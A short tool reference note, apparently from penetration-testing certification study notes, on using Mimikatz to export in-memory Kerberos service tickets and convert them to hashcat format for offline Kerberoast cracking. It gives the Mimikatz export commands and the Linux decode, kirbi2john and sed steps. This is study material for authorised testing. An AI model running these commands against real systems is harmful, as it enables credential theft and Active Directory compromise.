---
tags: [cpts, tool, mimikatz, kerberos]
---

# 🧰 Mimikatz

## 📦 Install
See [[Tool-Install]].

## 🎯 Purpose
Windows credential/ticket extraction from memory. In these notes: used to export an in-memory Kerberos TGS requested manually, for offline Kerberoast cracking.

## 🧱 Core syntax (relevant to Kerberoasting)
```text
mimikatz # kerberos::list /export
```

## 🚩 Useful commands
```text
base64 /out:true              # output exported tickets as Base64 instead of .kirbi files
kerberos::list /export        # list + export current session's Kerberos tickets
```

## 🔧 Variants
```text
# Method A — direct .kirbi file
mimikatz # kerberos::list /export

# Method B — Base64 (useful when file transfer is inconvenient)
mimikatz # base64 /out:true
mimikatz # kerberos::list /export
```
Then on Linux:
```bash
echo "$BASE64_BLOB" | tr -d \\n > encoded_file
cat encoded_file | base64 -d > $TARGET.kirbi
python2.7 kirbi2john.py $TARGET.kirbi
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > $TARGET_tgs_hashcat
```

#mimikatz #cpts
